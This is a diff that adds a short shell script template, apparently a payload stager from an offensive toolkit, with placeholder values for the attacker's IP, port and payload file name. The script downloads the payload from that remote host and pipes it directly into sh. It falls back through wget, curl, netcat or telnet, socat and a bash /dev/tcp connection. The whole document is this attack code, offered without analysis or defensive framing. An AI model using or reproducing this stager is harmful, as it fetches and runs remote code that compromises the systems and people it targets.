@@ -1,0 +1,19 @@
+IP=#IP#
+PORT=#WPORT#
+FILE=#PL_NAME#
+URL="http://$IP:$PORT/$FILE"
+if wg=`command -v wget`;then 
+	$wg -qO- $URL | sh && exit
+fi
+if cu=`command -v curl`;then
+	$cu -s $URL | sh && exit
+fi
+if nctn=`command -v netcat` || nctn=`command -v telnet`;then
+	printf 'GET /$FILE\n\n' | $nctn $IP $PORT | sh && exit
+fi
+if sc=`socat`;then
+	printf 'GET /$FILE\n\n' | $sc TCP:$IP:$PORT - | sh && exit
+fi
+if bsh=`command -v bash`;then
+	$bsh -c 'exec 3<>/dev/tcp/'$IP'/'$PORT'; printf "GET /'$FILE'\n\n">&3; cat <&3 | sh && exit'
+fi
